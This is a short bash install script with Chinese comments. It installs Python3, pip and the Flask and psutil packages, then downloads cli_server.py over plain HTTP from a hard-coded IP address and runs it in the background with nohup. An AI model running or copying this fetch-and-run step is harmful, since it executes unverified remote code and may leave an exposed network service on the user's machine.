#!/bin/bash

# 检查 Python3 是否安装
if ! command -v python3 &> /dev/null
then
    echo "Python3 未安装。正在安装..."

    # 检测操作系统类型
    OS=$(cat /etc/os-release | grep ^ID= | cut -d '=' -f 2)

    if [ "$OS" == "ubuntu" ] || [ "$OS" == "debian" ]
    then
        sudo apt update
        sudo apt install -y python3
    elif [ "$OS" == "fedora" ]
    then
        sudo dnf install -y python3
    else
        echo "不支持的操作系统。"
        exit 1
    fi
fi

# 检查 pip 是否安装
if ! command -v pip &> /dev/null
then
    echo "pip 未安装。正在安装..."
    sudo apt install -y python3-pip  # 适用于 Debian/Ubuntu
    # sudo dnf install -y python3-pip  # 适用于 Fedora
fi

# 安装所需的 Python 包
pip install psutil platform flask flask_cors

# 下载 Python 脚本
wget http://211.101.232.44:10088/static/cli_server.py

# 在后台执行下载的 Python 脚本
nohup python3 cli_server.py &
